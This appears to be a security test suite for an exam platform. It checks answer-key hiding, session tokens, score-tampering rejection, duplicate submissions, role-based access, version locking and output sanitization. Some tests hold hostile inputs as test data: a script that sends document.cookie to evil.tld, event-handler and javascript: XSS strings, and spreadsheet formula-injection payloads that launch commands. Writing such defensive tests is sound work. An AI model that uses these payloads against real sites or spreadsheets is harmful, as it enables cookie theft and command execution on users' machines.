/**
 * Section 6.1, 6.5 & Section 7: Security & Trust Boundary Tests
 * - Prevents answer_key leakage in Exam Mode API responses
 * - Ignores & logs client-side score payload tampering on submission
 * - Prevents cross-session read/write by unauthorized students
 * - Blocks duplicate submissions via Idempotency-Key & session state lock
 * - Sanitizes XSS payloads from Word content / editor inputs
 * - Blocks unauthorized access to Teacher RBAC endpoints
 * - Sanitizes CSV exports against Spreadsheet Formula Injection (=, +, -, @, \t, \r)
 * - Blocks in-place mutation of active exam versions with ongoing sessions
 */

import { describe, expect, it } from 'vitest';
import request from 'supertest';
import { createServerApp } from '../server/app';
import { escapeCsvCell, generateSafeCsv, sanitizeWordHtml } from '../src/lib/security-utils';

const TEACHER_HEADERS = {
  'X-Role': 'teacher',
  'X-Teacher-Auth': 'teacher-authorized-session-2026',
};

describe('Section 7: Security, Trust Boundaries & API Integrity Tests', () => {
  const app = createServerApp();

  it('never leaks answer_key or explanation in Exam Mode API responses', async () => {
    const res = await request(app).get('/api/exams/exam_thpt_math_phys_2026_01?mode=exam');
    expect(res.status).toBe(200);
    expect(res.body.mode).toBe('exam');
    for (const q of res.body.exam.questions) {
      expect(q.answer_key).toBeUndefined();
      expect(q.explanation).toBeUndefined();
    }
  });

  it('prevents cross-session reading without the matching HMAC session token', async () => {
    const startRes = await request(app).post('/api/sessions/start').send({
      student_id: 'HS_ALICE',
      student_name: 'Alice Nguyen',
      mode: 'exam',
    });
    expect(startRes.status).toBe(201);
    const aliceSessionId = startRes.body.session.session_id;
    const aliceToken = startRes.body.session.session_token;

    // Bob tries to read Alice's session without Alice's token -> 403 Forbidden
    const unauthorizedRead = await request(app)
      .get(`/api/sessions/${aliceSessionId}`)
      .set('X-Session-Token', 'forged_or_bob_token');
    expect(unauthorizedRead.status).toBe(403);
    expect(unauthorizedRead.body.error).toBe('FORBIDDEN_SESSION_ACCESS');

    // Alice can read her own session with her valid token -> 200 OK
    const authorizedRead = await request(app)
      .get(`/api/sessions/${aliceSessionId}`)
      .set('X-Session-Token', aliceToken);
    expect(authorizedRead.status).toBe(200);
    expect(authorizedRead.body.session.student_id).toBe('HS_ALICE');
  });

  it('ignores client-side score payload tampering and prevents duplicate submissions', async () => {
    const startRes = await request(app).post('/api/sessions/start').send({
      student_id: 'HS_TAMPER_TEST',
      student_name: 'Tamper Tester',
      mode: 'exam',
    });
    const { session_id, session_token } = startRes.body.session;

    // Candidate submits only 1 correct answer (1.5 pts) but injects total_score: 10.0 in payload
    const submitRes1 = await request(app)
      .post(`/api/sessions/${session_id}/submit`)
      .set('X-Session-Token', session_token)
      .set('Idempotency-Key', 'idem_sub_001')
      .send({
        total_score: 10.0,
        score: 10.0,
        earned_points: 10.0,
        answers: {
          q_2026_001: {
            question_id: 'q_2026_001',
            value: { type: 'single_choice', selected_option_id: 'q_2026_001_opt_C' },
            flagged: false,
            client_updated_at: Date.now(),
            sequence_number: 1,
          },
        },
      });

    expect(submitRes1.status).toBe(200);
    // Server MUST ignore the injected 10.0 and compute 1.5 from authoritative answer key
    expect(submitRes1.body.receipt.total_score).toBe(1.5);
    expect(submitRes1.body.duplicate_prevented).toBe(false);

    // Duplicate submission attempt returns the exact same receipt with duplicate_prevented=true
    const submitRes2 = await request(app)
      .post(`/api/sessions/${session_id}/submit`)
      .set('X-Session-Token', session_token)
      .set('Idempotency-Key', 'idem_sub_002')
      .send({
        answers: {},
      });

    expect(submitRes2.status).toBe(200);
    expect(submitRes2.body.duplicate_prevented).toBe(true);
    expect(submitRes2.body.receipt.receipt_id).toBe(submitRes1.body.receipt.receipt_id);
  });

  it('blocks unauthorized student requests to Teacher Monitoring and Studio endpoints (RBAC)', async () => {
    const monitorRes = await request(app)
      .get('/api/monitor/dashboard')
      .set('X-Role', 'student');
    expect(monitorRes.status).toBe(403);
    expect(monitorRes.body.error).toBe('FORBIDDEN_RBAC');

    const publishRes = await request(app).post('/api/studio/publish').send({
      title: 'Hacked Title',
    });
    expect(publishRes.status).toBe(403);
  });

  it('blocks in-place mutation of an active exam version while allowing immutable new versions', async () => {
    // Attempt in-place mutation of v2 (which has active in_progress sessions)
    const mutateInPlaceRes = await request(app)
      .post('/api/studio/publish')
      .set(TEACHER_HEADERS)
      .send({
        exam_id: 'exam_thpt_math_phys_2026_01',
        mutate_version_in_place: true,
      });

    expect(mutateInPlaceRes.status).toBe(409);
    expect(mutateInPlaceRes.body.error).toBe('ACTIVE_EXAM_VERSION_IMMUTABLE');

    // Publish a new immutable version (v3) -> 201 Created
    const publishNewRes = await request(app)
      .post('/api/studio/publish')
      .set(TEACHER_HEADERS)
      .send({
        exam_id: 'exam_thpt_math_phys_2026_01',
        title: 'De Chinh Thuc Ma 204 - Ban Cap Nhat v3',
      });

    expect(publishNewRes.status).toBe(201);
    expect(publishNewRes.body.published_version).toBe(3);
  });

  it('sanitizes XSS payloads from Word content and editor strings', () => {
    const malicious =
      'Cho ham so <script>fetch("https://evil.tld/steal?c="+document.cookie)</script><img src=x onerror="alert(1)"> <a href="javascript:alert(2)">link</a> $y = x^2$';
    const cleaned = sanitizeWordHtml(malicious);

    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('onerror=');
    expect(cleaned).not.toContain('javascript:');
    expect(cleaned).toContain('$y = x^2$');
  });

  it('prevents CSV Formula Injection in exported candidate spreadsheets', async () => {
    expect(escapeCsvCell('=CMD|\' /C calc\'!A0')).toBe('"\'=CMD|\' /C calc\'!A0"');
    expect(escapeCsvCell('+SUM(A1:A10)')).toBe('"\'+SUM(A1:A10)"');
    expect(escapeCsvCell('@SUM(1,2)')).toBe('"\'@SUM(1,2)"');
    expect(escapeCsvCell('-cmd|calc')).toBe('"\'-cmd|calc"');
    // Legitimate negative numbers are preserved without corrupting numeric cells
    expect(escapeCsvCell('-12.5')).toBe('"-12.5"');

    const csv = generateSafeCsv(
      ['Name', 'Score'],
      [['=HYPERLINK("http://evil.tld","Click")', 9.5]]
    );
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.tld"",""Click"")"');

    // Verify endpoint export
    const exportRes = await request(app)
      .get('/api/monitor/export.csv')
      .set(TEACHER_HEADERS);
    expect(exportRes.status).toBe(200);
    expect(exportRes.headers['content-type']).toContain('text/csv');
    expect(exportRes.text).toContain('"Session ID","Student ID"');
  });
});
